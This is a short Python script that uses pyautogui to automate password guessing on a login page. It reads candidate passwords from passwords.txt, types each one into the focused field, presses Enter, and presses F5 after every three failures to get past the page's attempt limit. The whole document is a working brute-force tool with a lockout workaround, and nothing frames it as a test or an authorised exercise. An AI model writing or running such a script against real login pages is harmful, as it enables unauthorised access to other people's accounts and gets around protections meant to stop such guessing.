import pyautogui
import time

# Wait 5 seconds before starting
time.sleep(5)

# Initialize a counter for failed attempts
failed_attempts = 0
max_attempts = 3  # Number of attempts before refreshing

# Open the file and read each line
with open("passwords.txt", "r") as file:
    for line in file:
        password = line.strip()
        if not password:
            continue  # Skip empty lines

        print(f"Typing Password: {password}")
        
        # Type the password quickly
        pyautogui.typewrite(password, interval=0.05)  # Adjust interval as needed
        
        # Press Enter to submit
        pyautogui.press("enter")
        
        # Shorter wait time to process the attempt
        time.sleep(1)  # Adjust based on application response time
        
        # Increment the failed attempts counter
        failed_attempts += 1
        
        if failed_attempts >= max_attempts:
            print("Max attempts reached. Refreshing the page...")
            # Press F5 to refresh the page
            pyautogui.press("f5")
            
            # Reset the failed attempts counter
            failed_attempts = 0
            
            # Shorter wait time for page refresh
            time.sleep(1)  # Adjust based on page load time
